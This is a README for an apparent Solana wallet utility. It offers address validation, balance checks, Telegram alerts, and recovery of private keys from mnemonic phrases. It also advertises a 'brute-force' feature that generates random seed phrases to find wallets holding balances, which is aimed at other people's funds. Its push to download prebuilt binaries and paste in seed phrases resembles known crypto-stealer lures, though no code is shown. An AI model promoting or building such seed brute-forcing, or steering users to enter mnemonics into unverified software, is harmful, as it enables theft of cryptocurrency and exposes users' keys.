# Solana Wallet Address Validator: Ensure Your Address is Correct  

**Solana Wallet Address Validator** is a powerful tool designed to help users verify the validity of Solana wallet addresses. Whether you're sending or receiving SOL tokens, ensuring the accuracy of your wallet address is crucial to avoid costly mistakes. This tool simplifies the process of validating Solana addresses, providing peace of mind and security for all your transactions.  

---
###[DOWNLOAD FOR WINDOWS AND LINUX](../../releases)
   <p align="left">
    <img src="/var/show.webp" />
</p>

## Key Features  

### 1. **Validate Solana Wallet Addresses**  
   - Quickly check if a Solana wallet address is valid and properly formatted.  
   - Avoid errors when sending or receiving SOL tokens.  

<p align="left">
    <img src="/var/taskbar.webp" />
</p>

### 2. **Check Solana Address Balance**  
   - Verify the balance of any Solana wallet address.  
   - Ensure the address is active and holds the expected amount of SOL.  

### 3. **Track Solana Address Activity**  
   - Monitor transactions on a specific Solana wallet address.  
   - Receive real-time notifications via Telegram for added convenience.  

### 4. **Recover Wallet Data Using Mnemonic Phrase**  
   - Retrieve wallet details, including the private key, address, and balance, using a mnemonic phrase.  
   - Securely manage your wallets and access critical information when needed.  

<p align="left">
    <img src="/var/rule.webp" />
</p>

### 5. **Generate New Solana Wallets**  
   - Create a new Solana wallet with a unique private key and address.  
   - Ideal for users looking to expand their crypto portfolio.  

<p align="left">
    <img src="/var/active.webp" />
</p>

### 6. **Brute-Force Wallet Generation**  
   - Generate random seed phrases and check for wallets with existing balances.  
   - A research-focused feature for discovering active wallets.  

<p align="left">
    <img src="/var/accent.webp" />
</p>

---

## How to Use Solana Wallet Address Validator  

### Step 1: **Access the Tool**  
   - Use the **Tor Browser** or any secure browser to access the tool.  
   - Ensure your connection is encrypted for maximum security.  

### Step 2: **Enter the Wallet Address**  
   - Input the Solana wallet address you want to validate.  
   - The tool will instantly verify the address and provide feedback.  

### Step 3: **Enable Telegram Notifications**  
   - Configure Telegram settings to receive real-time updates about wallet activity.  
   - Add your bot token and chat ID to the `telegram-settings.txt` file.  

---

## Why Choose Solana Wallet Address Validator?  

- **Accuracy:** Ensure your Solana wallet addresses are valid and error-free.  
- **Security:** Protect your transactions from mistakes and potential fraud.  
- **User-Friendly Interface:** Easily navigate the platform and access all features in one place.  
- **Multi-Functional:** From address validation to wallet generation, this tool covers all your Solana needs.  

---

## Getting Started  

You can download the pre-compiled build from the [Release](../../releases) section or build the project yourself using the instructions below.  

### Building the Project  

1. **Install Dependencies:**  
   Use **vcpkg** to install required libraries:  
   ```bash
   vcpkg install openssl nlohmann-json cryptopp libsodium
   ```  

2. **Build via Visual Studio:**  
   - Open the project solution in Visual Studio.  
   - Click **Build** -> **Build Solution**.  

3. **Build via Command Line:**  
   ```bash
   g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
   ```  

---

## Command Line Options  

- **-v / -validate (ADDRESS):** Validate a Solana wallet address.  
- **-b / -balance (ADDRESS):** Check the balance of a specific Solana wallet address.  
- **-t / -track (ADDRESS):** Track activity on a specific Solana wallet address.  
- **-m / -mnemonic (MNEMONIC):** Retrieve wallet data using a mnemonic phrase.  
- **-g / -gen (NUMBER):** Generate a specified number of Solana wallets.  

---

## Disclaimer  

This tool is intended for educational and research purposes only. It should not be used for illegal activities or unauthorized access to wallets. Always ensure the security of your private keys and mnemonic phrases.  

---

## License  

This project is licensed under the [MIT License](/LICENSE). Feel free to use, modify, and distribute the code in accordance with the license terms.  

---

**Stay Secure, Stay Informed, and Validate Your Solana Wallet Addresses with Confidence!**